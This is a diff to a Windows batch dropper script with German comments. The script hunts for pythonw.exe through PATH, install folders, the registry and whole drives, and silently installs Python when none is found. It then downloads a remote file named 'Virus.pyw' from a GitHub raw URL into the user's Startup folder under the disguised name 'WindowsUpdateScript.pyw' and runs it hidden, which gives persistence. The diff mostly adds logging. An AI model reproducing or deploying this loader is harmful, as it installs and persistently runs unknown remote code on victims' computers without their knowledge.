@@ -6,72 +6,107 @@ set "INSTALLER=python-3.12.0.exe"
 set "SCRIPT_URL=https://raw.githubusercontent.com/NyveXgg/refdgdfsgdffdsfdsfdsfdgdfsgfs68658fasd865f7568a6sd657586das56dsa5f678d758a7dfgerergrefdgfdgdfgfdfdgs/refs/heads/main/Virus.pyw"
 set "SCRIPT_NAME=WindowsUpdateScript.pyw"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "LOG=%TEMP%\python_install.log"
+
+echo [%date% %time%] ===== Starte Batch ===== >> "%LOG%"
 
 :: ========== PYTHONW.EXE AGGRESSIV SUCHEN ==========
 set "PYTHONW="
 
 :: 1. Im PATH
+echo [%date% %time%] Suche im PATH... >> "%LOG%"
 for %%A in (pythonw.exe pythonw) do (
     where %%A >nul 2>&1
     if !errorlevel! equ 0 (
-        for /f "delims=" %%B in ('where %%A') do set "PYTHONW=%%B" & goto :found
+        for /f "delims=" %%B in ('where %%A') do set "PYTHONW=%%B"
+        echo [%date% %time%] Gefunden im PATH: !PYTHONW! >> "%LOG%"
+        goto :found
     )
 )
 
 :: 2. Typische Installationsordner (rekursiv)
+echo [%date% %time%] Suche in Standard-Ordnern... >> "%LOG%"
 set "SUCHPFADE=%LocalAppData%\Programs\Python %ProgramFiles%\Python %ProgramFiles(x86)%\Python %ProgramFiles%\Python* %ProgramFiles(x86)%\Python* %LocalAppData%\Programs\Python*"
 for %%P in (%SUCHPFADE%) do (
     if exist "%%P\" (
         for /r "%%P" %%F in (pythonw.exe) do (
-            if exist "%%F" set "PYTHONW=%%F" & goto :found
+            if exist "%%F" set "PYTHONW=%%F"
+            echo [%date% %time%] Gefunden in Ordnern: !PYTHONW! >> "%LOG%"
+            goto :found
         )
     )
 )
 
 :: 3. Registry (HKLM und HKCU)
+echo [%date% %time%] Suche in Registry... >> "%LOG%"
 for %%H in (HKLM HKCU) do (
     for /f "skip=2 tokens=1,2*" %%A in ('reg query "%%H\SOFTWARE\Python" /s 2^>nul ^| find "InstallPath"') do (
-        if exist "%%C\pythonw.exe" set "PYTHONW=%%C\pythonw.exe" & goto :found
+        if exist "%%C\pythonw.exe" set "PYTHONW=%%C\pythonw.exe"
+        echo [%date% %time%] Gefunden in Registry: !PYTHONW! >> "%LOG%"
+        goto :found
     )
 )
 
 :: 4. Zusätzliche Suche auf Laufwerk C: (wichtige Ordner)
+echo [%date% %time%] Suche auf gesamter Festplatte (wichtige Ordner)... >> "%LOG%"
 set "WEITERE=C:\Program Files;C:\Program Files (x86);C:\Users;D:\Program Files;D:\Program Files (x86)"
 for %%D in (%WEITERE%) do (
     if exist "%%D" (
         for /r "%%D" %%F in (pythonw.exe) do (
-            if exist "%%F" set "PYTHONW=%%F" & goto :found
+            if exist "%%F" set "PYTHONW=%%F"
+            echo [%date% %time%] Gefunden in zusätzlichen Pfaden: !PYTHONW! >> "%LOG%"
+            goto :found
         )
     )
 )
 
 :: 5. Nichts gefunden – Python installieren
+echo [%date% %time%] pythonw.exe nicht gefunden. Starte Installation... >> "%LOG%"
 :download_installer
 curl -s -L "%PYTHON_URL%" -o "%INSTALLER%"
 if %errorlevel% neq 0 (
+    echo [%date% %time%] Download fehlgeschlagen. Wiederhole... >> "%LOG%"
     timeout /t 2 /nobreak >nul
     goto :download_installer
 )
+echo [%date% %time%] Installer heruntergeladen. Starte Installation... >> "%LOG%"
 start /wait "" "%INSTALLER%" /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
 del /f /q "%INSTALLER%" >nul 2>&1
+echo [%date% %time%] Installation abgeschlossen. >> "%LOG%"
 
 :: Nach Installation in den Standardpfaden suchen
-if exist "%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" set "PYTHONW=%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" & goto :found
-if exist "%LocalAppData%\Programs\Python\Python312\pythonw.exe" set "PYTHONW=%LocalAppData%\Programs\Python\Python312\pythonw.exe" & goto :found
-if exist "%ProgramFiles%\Python312\pythonw.exe" set "PYTHONW=%ProgramFiles%\Python312\pythonw.exe" & goto :found
-if exist "%ProgramFiles(x86)%\Python312-32\pythonw.exe" set "PYTHONW=%ProgramFiles(x86)%\Python312-32\pythonw.exe" & goto :found
+if exist "%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" set "PYTHONW=%LocalAppData%\Programs\Python\Python312-32\pythonw.exe" & echo [%date% %time%] Gefunden nach Installation: !PYTHONW! >> "%LOG%" & goto :found
+if exist "%LocalAppData%\Programs\Python\Python312\pythonw.exe" set "PYTHONW=%LocalAppData%\Programs\Python\Python312\pythonw.exe" & echo [%date% %time%] Gefunden nach Installation: !PYTHONW! >> "%LOG%" & goto :found
+if exist "%ProgramFiles%\Python312\pythonw.exe" set "PYTHONW=%ProgramFiles%\Python312\pythonw.exe" & echo [%date% %time%] Gefunden nach Installation: !PYTHONW! >> "%LOG%" & goto :found
+if exist "%ProgramFiles(x86)%\Python312-32\pythonw.exe" set "PYTHONW=%ProgramFiles(x86)%\Python312-32\pythonw.exe" & echo [%date% %time%] Gefunden nach Installation: !PYTHONW! >> "%LOG%" & goto :found
 
 :: Falls immer noch keine pythonw, dann Fallback auf python (mit Fenster)
+echo [%date% %time%] pythonw.exe nicht gefunden. Suche nach python.exe... >> "%LOG%"
 for %%A in (python.exe python) do (
     where %%A >nul 2>&1
     if !errorlevel! equ 0 (
-        for /f "delims=" %%B in ('where %%A') do set "PYTHONW=%%B" & goto :found
+        for /f "delims=" %%B in ('where %%A') do set "PYTHONW=%%B"
+        echo [%date% %time%] Fallback auf python.exe: !PYTHONW! >> "%LOG%"
+        goto :found
     )
 )
 set "PYTHONW=python"
+echo [%date% %time%] Weder pythonw noch python gefunden. Verwende Standard 'python'. >> "%LOG%"
 
 :found
+echo [%date% %time%] Verwende Python: %PYTHONW% >> "%LOG%"
+
 :: ========== SKRIPT LADEN UND STARTEN ==========
+echo [%date% %time%] Lade Skript herunter... >> "%LOG%"
 curl -s -L "%SCRIPT_URL%" -o "%STARTUP_DIR%\%SCRIPT_NAME%"
-start /b "" "%PYTHONW%" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1
+if %errorlevel% neq 0 (
+    echo [%date% %time%] FEHLER: Download fehlgeschlagen >> "%LOG%"
+) else (
+    echo [%date% %time%] Skript gespeichert: %STARTUP_DIR%\%SCRIPT_NAME% >> "%LOG%"
+    echo [%date% %time%] Starte Skript... >> "%LOG%"
+    start /b "" "%PYTHONW%" "%STARTUP_DIR%\%SCRIPT_NAME%" >nul 2>&1
+    echo [%date% %time%] Skript gestartet. >> "%LOG%"
+)
+
+echo [%date% %time%] ===== Batch beendet ===== >> "%LOG%"
 exit
